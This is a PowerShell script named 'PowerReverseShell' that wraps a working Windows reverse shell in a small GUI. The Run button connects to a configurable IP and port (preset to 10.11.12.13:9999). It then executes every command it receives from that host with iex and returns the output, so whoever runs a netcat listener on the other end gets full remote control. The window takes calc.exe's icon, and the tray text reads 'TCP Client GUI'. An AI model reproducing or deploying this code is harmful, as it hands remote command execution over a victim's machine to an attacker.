#
##       PowerReverseShell    ##
## -----------------------------
#
# Simple Windows Reverse Shell
#
# (C) 2024 by suuhm (https://github.com/suuhm)
# All rights reserved
#
# TODO: 
# - Threading on Run routine 
# - History savings of IP ports
# - Notify
# - Bugfixing
#

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Management.Automation

$IP="10.11.12.13"
$PORT=9999

$form = New-Object System.Windows.Forms.Form
$form.Text = 'PowerReverseShell v0.1a    (c) 2024 by suuhm'
$form.Size = New-Object System.Drawing.Size(410, 260)
$form.StartPosition = 'CenterScreen'
$form.MaximizeBox=$false
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$iconPath = "$env:SystemRoot\system32\calc.exe"
$iconIndex = 9
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($iconPath)
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($iconPath).ToBitmap()
$form.Icon = [System.Drawing.Icon]::FromHandle($icon.GetHicon())
#$Form.Icon = "%SystemRoot%\system32\SHELL32.dll,4"

$labelIP = New-Object System.Windows.Forms.Label
$labelIP.Location = New-Object System.Drawing.Point(10, 20)
$labelIP.Size = New-Object System.Drawing.Size(100, 20)
$labelIP.Text = "IP:"
$form.Controls.Add($labelIP)

$textBoxIP = New-Object System.Windows.Forms.TextBox
$textBoxIP.Location = New-Object System.Drawing.Point(120, 20)
$textBoxIP.Size = New-Object System.Drawing.Size(200, 20)
$textBoxIP.Text = $IP
$form.Controls.Add($textBoxIP)

$labelPort = New-Object System.Windows.Forms.Label
$labelPort.Location = New-Object System.Drawing.Point(10, 50)
$labelPort.Size = New-Object System.Drawing.Size(100, 20)
$labelPort.Text = "Port:"
$form.Controls.Add($labelPort)

$textBoxPort = New-Object System.Windows.Forms.TextBox
$textBoxPort.Location = New-Object System.Drawing.Point(120, 50)
$textBoxPort.Size = New-Object System.Drawing.Size(200, 20)
$textBoxPort.Text = $PORT
$form.Controls.Add($textBoxPort)

# Label "nc -lvp"
$labelNc = New-Object System.Windows.Forms.Label
$labelNc.Location = New-Object System.Drawing.Point(10, 80)
$labelNc.Size = New-Object System.Drawing.Size(400, 20)
#$labelNc.
$labelNc.Text = "Run on Remote machine with IP ($IP) -> nc -lvp $PORT"
$form.Controls.Add($labelNc)

$labelConnected = New-Object System.Windows.Forms.Label
$labelConnected.Location = New-Object System.Drawing.Point(10, 110)
$labelConnected.Size = New-Object System.Drawing.Size(200, 20)
$labelConnected.Text = ""
$form.Controls.Add($labelConnected)

$buttonRun = New-Object System.Windows.Forms.Button
$buttonRun.Location = New-Object System.Drawing.Point(150, 140)
$buttonRun.Size = New-Object System.Drawing.Size(100, 30)
$buttonRun.Text = "Run"
$buttonRun.Add_Click({
    try {
        $IP = $textBoxIP.Text
        $PORT = [int]$textBoxPort.Text
        $labelConnected.Text = "Connected!"

        $client = New-Object System.Net.Sockets.TCPClient($IP, $PORT)
        $stream = $client.GetStream()
        $bytes = New-Object byte[] 65536

        while($true) {
            $i = $stream.Read($bytes, 0, $bytes.Length)
            if ($i -eq 0) { break }
            $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
            $sendback = (iex $data 2>&1 | Out-String)
            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
            $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
        
    } catch {
        $labelConnected.Text = "Fail to connect to ${IP}:$PORT!"
        [System.Windows.Forms.MessageBox]::Show("Connection failed, please check your IP and Port and nc on remote machine.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        
    }
})
$form.Controls.Add($buttonRun)



# Exit-Button
$buttonExit = New-Object System.Windows.Forms.Button
$buttonExit.Location = New-Object System.Drawing.Point(150, 180)
$buttonExit.Size = New-Object System.Drawing.Size(100, 30)
$buttonExit.Text = "Exit"
$buttonExit.Add_Click({
    $form.Close()
})
$form.Controls.Add($buttonExit)

$notifyIcon = New-Object System.Windows.Forms.NotifyIcon
$notifyIcon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Process -Id $PID).Path)
$notifyIcon.Visible = $true
$notifyIcon.Text = "TCP Client GUI"
$notifyIcon_MouseClick = {
    if ($form.WindowState -eq "Minimized") {
        $form.WindowState = "Normal"
    } else {
        $form.WindowState = "Minimized"
    }
}
$notifyIcon.add_Click($notifyIcon_MouseClick)

$form.ShowDialog() | Out-Null
